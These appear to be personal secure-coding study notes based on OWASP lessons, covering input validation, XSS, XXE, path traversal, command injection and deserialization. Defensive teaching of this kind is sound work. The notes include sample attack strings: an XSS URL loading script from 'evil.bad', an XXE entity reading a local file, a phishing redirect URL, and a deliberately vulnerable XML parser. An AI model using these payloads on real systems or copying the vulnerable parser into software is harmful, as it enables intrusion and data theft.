	# Input Validation aka input allow listing
- effective & simple security best practice
- ==all user input should be considered unsafe by default==
- prevent security flaws by implementing input verification checks such as:
	- input should only contain digits if the input type is numeric
	- input should only contain unicode letter data if the input type is alphabetic
	- input should match the format of an e-mail GUID or PIN number if those are the intended types
	- the input should not exceed a certain size
- prevents redirect
- in an HTTP request there are many parammeters that are simply {alpha}numeric
```
https://api.twitter.com/2/search/adaptive.json
?include_profile_interstitial_type=1&include_blocking=1&include_blocked_by=1
&include_followed_by=1&include_want_retweets=1&include_mute_edge=1&include_can_dm=1&include_can_media_tag=1&skip_status=1
&cards_platform=Web-12&include_cards=1&include_composer_source=true&include_ext_alt_text=true&include_reply_count=1
&tweet_mode=extended&include_entities=true&include_user_entities=true&include_ext_media_color=true&send_error_codes=true&q=security
&count=20&query_source=typd&pc=1&spelling_corrections=1&ext=mediaStats%2ChighlightedLabel
```
- by validating the input of the request parameters, 90% of the attack surface is eliminated
## Block lists vs allow lists
- sometimes developers are tempted to take a blocking approach
- however, block lists can be bypassed & may in fact cause automated tools & less experienced testers to miss security issues
- **Allow lists are strongly preferred**, protecting against:
	- URL Redirection to Untrusted Site ("Open Redirect") -- allow only specified URLs
	- Improper Neutralization of input during web page generation ("Cross-site scripting") -- allow only alphanumeric chars
	- improper limitation of a Pathname to a restricted directory
## missing/incorrect authorization
- CWE 862 *The software does not perform an authorization check when an actor attempts to access a resource or perform an action.*
		- resource separation/segmentation minimizes the impact of unauthorized access by limiting the resources a certain user or role has access to
		- resources can be network resources such as LANs or data resources such as different customer databases used in a SaaS offering
		- likewise goes for URLs & other server resources (segment based on access)
		- _"Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [R.862.1] to enforce the roles at the appropriate boundaries. Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role."![Attack-Gram for this category](https://securecodingdojo.owasp.org/static/lessons/attack-grams/missingauthz.png)
- CWE 306: _"The software does not perform any authentication for functionality that requires a provable user identity or consumes a significant amount of resources."
![Attack-Gram for this category](https://securecodingdojo.owasp.org/static/lessons/attack-grams/authbypass.png)_
	- **authenticated by default**
	- software should be designed in such a way that new functionality is automatically protected by authentication
	- 

## Use parameterized statements instead of string concatenation to prevent injection attacks

## Memory safety
- "0 days" are system components vulnerabilities, often leveraged by malware & viruses
	- system services
	- browsers
	- crypto libraries
	- document readers
- most common mistakes are:
	- Buffer Copy without checking size of input - CWE 120
	- incorrect calculation of buffer size - CWE 120
	- off by one - CWE 193
	- uncontrolled format string - CWE 134
- all lead to arbitrary access of memory outside the intended boundaries (**"Overflow"**)
- Overflows can be prevented by controlling the number of characters read into the buffer. This is done **using memory safe functions**
	- (or languages like Python/Rust)
	- functions that control the amount of data read into memory
	- input and input size validation
	- using constants for buffer sizes
	- paying attention to comparison operators while reading into memory
	- avoid input in a format string

## Protecting data
- protect data from unauthorized access
- confidentiality is one of three essential elements of information security, also known as the CIA triad:
	  - **Confidentiality**
	  - **Integrity**
	  - **Availability**
  - use one-way salted hashes with multiple iterations to store passwords
  - secure transmission of data **using latest TLS protocols and strongest ciphers**
  - **encrypt data at rest using the strongest cryptopraphic algorithm & keys**
	  - CWE 759: _The software uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the software does not also use a salt as part of the input._
	  - Salted SHA-2 class (SHA256 and up) foruser passwords
	  - Symmetric AES256 CBC with dynamic key/iv
	  - Asymmetric RSA 2048
  - Store encryption keys in a restricted KMS

## Cross-site scripting
- script makes it onto the page via a specially crafted URL sent to the user ("reflected XSS"), or by saving it into the site as an article or message ("stored XSS")
	- example reflecetd XSS:
`https://site.com/search.jsp?q='"/><script src="https://evil.bad/xss.js"></script>`

- **Neutralize the user input**
	- done implicitly by most modern Javascript frameworks like React or Angular

# Indirect Object References
- prevents vulnerabilities such as Path Traversal, Open Redirect because resources are accessed indirectly, through an intermediary identifier such as `list` or `hashmap`
- by limiting the set of objects that are 
- limits the set of objects to an authorized collection it also helps mitigate logical abuses and authorization bypasses
- best practice also has the following benefits:
-   Prevents transmission of potentially sensitive data in URLs. Ex. instead of userEmail=`john.doe@company.com` use userEmailId=`52`.
-   Input validation is easier to do. If the parameter is numeric or a GUID, validation is more straightforward than having to validate a person name or file path

# Integer Overflow or Wraparound
- CWE 190: "_The software performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control_"
- ![Attack-Gram for this category](https://securecodingdojo.owasp.org/static/lessons/attack-grams/intoverflow.png)


## Download of code without integrity check (man in the middle attack)
- CWE 494: _The product downloads source code or an executable from a remote location and executes the code without sufficiently verifying the origin and integrity of the code._

# URL Redirecttion
- CWE 601: _A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks._
`https://www.mybank.com/login?bogus1=956292465974632954923659245692456&bogus2=93524956934756923435634796534295634&bogus3=965532974534257935647923567495679562347965234975642397562397566345629465956542945739563975349&redirectUrl=`http://www-1.mybank.com/fakelogin`
- hash collisions can be taken advantage of to bypass checksums (MD5 & SHA1 are vulnerable)

An approach that attempts to resolve this problem is using RSA signatures in a similar way TLS communication works. Here is the process at a high level:

-   The software update site provides a certificate which can be verified by a public authority such as Verisign
-   The private key for this certificate is closely guarded and never shared with consumers of the software
-   When new software is released the update package is hashed using a strong algorithm (SHA-256+)
-   The hash is in turn signed with the private key that only the software provider knows
-   The software signing certificate containing the public key is packaged along with the software and the signed hash
-   When the software consumer downloads the package it first checks that the certificate is valid (using the trusted Certificate authority)
-   Next the consumer uses the certificate public key to verify the signature and verifies the hash matches the update contents.


# Unrestricted upload of file with dangerous type
- CWE 434: _The software allows the attacker to upload or transfer files of dangerous types that can be automatically processed within the product's environment._
- DO NOT ALLOW INPUT OF `.exe`, `.bat`, or `.sh`!!
- think of user upload bottons
## improper restriction of XML External Entitiy Reference ('XXE')
- [CWE 611](https://cwe.mitre.org/data/definitions/611.html):_The software processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output._
- XXE is expoited through DTDs (Document Type Definitions)
	- DTDs allow the creation of XML entities: **variables that can be assigned a string value when the XML document gets processed**
	- the entity values could be configured with values external to the document, such as in the example below:
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///var/www/myapp/welcome.txt">]>
<svg width="100" height="100"><text x="10" y="20" fill="red">&xxe;</text></svg>
```
![Attack-Gram for this category](https://securecodingdojo.owasp.org/static/lessons/attack-grams/xxe.png)
##### vulnerable function
```python
import xml.etree.ElementTree as ET

def parseXML(xml):
    root = ET.fromstring(xml)
    return root
```

#### secure function equivalent
```python
from defusedxml import ElementTree as ET

def parseXML(xml):
    parser = ET.DefusedXMLParser()
    root = ET.fromstring(xml, parser=parser)
    return root
```


# Improper Limitation of a Pathname to a restricted directory ('path traversal')
[CWE 22](https://cwe.mitre.org/data/definitions/22.html): _The software uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the software does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory._

- also known as a `../` attack
- Limit pathnames to a restricted directory to mitigate

![Attack-Gram for this category](https://securecodingdojo.owasp.org/static/lessons/attack-grams/pathtraversal.png)

# Incorrect authorization
[CWE 863](https://cwe.mitre.org/data/definitions/863.html): _The software performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check. This allows attackers to bypass intended access restrictions._

# Improper Neutralization of special elements used in an OS command ("OS command injection")
- [CWE 78](https://cwe.mitre.org/data/definitions/78.html)  _The software constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component._
- relates to:
	- [CWE 250](https://cwe.mitre.org/data/definitions/250.html): _The software performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses._
	- [CWE 732](https://cwe.mitre.org/data/definitions/732.html): _The software specifies permissions for a security-critical resource in a way that allows that resource to be read or modified by unintended actors._
- again stems from unsanitized user input
- ![Attack-Gram for this category](https://securecodingdojo.owasp.org/static/lessons/attack-grams/commandinjection.png)

# Buffer copy without checking size of input
- specific C/C++ applications
    
    > _The program copies an input buffer to an output buffer without verifying that the size of the input buffer is less than the size of the output buffer, leading to a buffer overflow._
    > 
    > From MITRE [CWE 120](https://cwe.mitre.org/data/definitions/120.html)
    
-   Use of Potentially Dangerous Function
    
    > _The program invokes a potentially dangerous function that could introduce a vulnerability if it is used incorrectly, but the function can also be used safely._
    > 
    > From MITRE [CWE 676](https://cwe.mitre.org/data/definitions/676.html)

# Deserialization of untrusted data
[CWE 502](https://cwe.mitre.org/data/definitions/502.html): _The application deserializes untrusted data without sufficiently verifying that the resulting data will be valid._

- application accepts a serialized object as input, loads it into memory, & operates on it
- if your application calls `System.exec()` on data stored in the object, then an attacker-controlled command would execute on your host, under your application privileges
- If your object allows input (user input, remote systems, files or database entries that anyone else may have written, etc) to arbirarially control which class your code will instantiate, then you probably have a desearialization vulnerability